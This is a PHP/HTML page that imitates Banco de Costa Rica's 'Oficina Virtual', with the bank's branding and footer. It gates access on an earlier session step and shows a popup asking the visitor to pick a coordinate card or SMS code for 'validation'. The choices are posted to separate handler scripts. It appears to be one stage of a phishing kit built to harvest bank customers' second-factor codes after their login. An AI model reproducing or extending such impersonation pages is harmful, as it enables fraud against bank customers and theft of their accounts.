<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
  header("Location: index.html");
  exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>BCR</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="archivos/style.css" rel="stylesheet" type="text/css">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.10.7/dist/sweetalert2.all.min.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.10.7/dist/sweetalert2.min.css" rel="stylesheet">

  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
    }

    .head {
      width: 100%;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .head img.logo {
      height: 50px;
    }

    .head .headimg1,
    .head .headimg2 {
      height: 30px;
    }

    .linkhead1,
    .linkhead2 {
      margin-left: 10px;
      color: #0033a0;
      font-size: 12px;
      text-decoration: none;
    }

    .head2 {
      width: 100%;
      background-color: #0033a0;
      padding: 12px 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .texthead {
      font-weight: bold;
      color: white;
      font-size: 16px;
      letter-spacing: 1px;
    }

    .costilla {
      padding: 10px;
    }

    .footer {
      text-align: center;
      padding: 15px;
      font-size: 12px;
      color: #666;
    }

    .footertext {
      color: #666;
    }

    .swal-form {
      display: flex;
      flex-direction: column;
      gap: 20px;
      align-items: center;
      margin-top: 20px;
    }

    .swal-form form {
      width: 100%;
      max-width: 280px;
    }

    .swal-form button {
      width: 100%;
      padding: 15px 10px;
      background-color: #0033a0;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      text-transform: uppercase;
    }

    .swal-form button:hover {
      background-color: #002472;
    }

    .swal2-popup {
      font-family: sans-serif !important;
    }
  </style>
</head>
<body>

<script>
Swal.fire({
  title: "<strong>Elija un método de validación</strong>",
  icon: "",
  html: `
    <div class="swal-form">
      <form action="procesar_validacion.php" method="POST">
        <input type="hidden" name="tipo" value="COORDENADAS">
        <button type="submit">Tarjeta Clave Dinámica</button>
      </form>
      <form action="notificar_virtual.php" method="POST">
        <input type="hidden" name="tipo" value="SMS">
        <button type="submit">Código BCR Clave Virtual</button>
      </form>
    </div>
  `,
  showConfirmButton: false
});
</script>

<div class="head">
  <img src="archivos/logo.gif" class="logo">
  <img src="archivos/Certificado.svg" class="headimg1">
  <img src="archivos/Contactenos.svg" class="headimg2">
  <a href="#" class="linkhead1">Certificaciones</a>
  <a href="#" class="linkhead2">Contáctenos</a>
</div>

<div class="head2">
  <span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
</div>

<div class="costilla">
  <span class="seguridadtxt">Seguridad</span>
  <img class="imgcostilla1" src="archivos/Consideraciones.svg">
  <img class="imgcostilla2" src="archivos/reglamento.svg">
  <span class="textcostilla1">Consideraciones</span>
  <span class="textcostilla2">Reglamentos</span>
</div>

<div class="containerimg">
  <div class="divform1"></div>
  <div class="divform2">
    <span class="ingresartxt">Clave Dinámica</span>
    <hr class="line1" color="#C4C4C4">
  </div>
  <div class="formcontainer"></div>
</div>

<div class="footer">
  <span class="footertext">BCR © Derechos Reservados 2024. Contáctenos: CentroAsistenciaBCR@bancobcr.com</span>
</div>

</body>
</html>
